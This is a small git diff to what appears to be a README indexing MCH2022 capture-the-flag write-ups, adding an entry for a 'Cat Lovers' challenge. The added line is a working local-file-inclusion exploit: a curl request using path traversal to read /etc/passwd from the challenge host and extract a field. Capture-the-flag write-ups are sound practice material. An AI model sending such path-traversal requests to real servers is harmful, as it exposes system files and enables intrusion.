@@ -30,6 +30,8 @@ Secure Router: https://github.com/craig/MCH2022-CTF/blob/main/secure_router.txt
 
 Captcha: https://github.com/craig/MCH2022-CTF/blob/main/captcha.txt
 
+Cat Lovers: simple LFI, curl https://catlovers.ctf.zone/image.php?file=../../../../etc/passwd | grep catlover | cut -d: -f5
+
 ## Network
 
 ## Misc
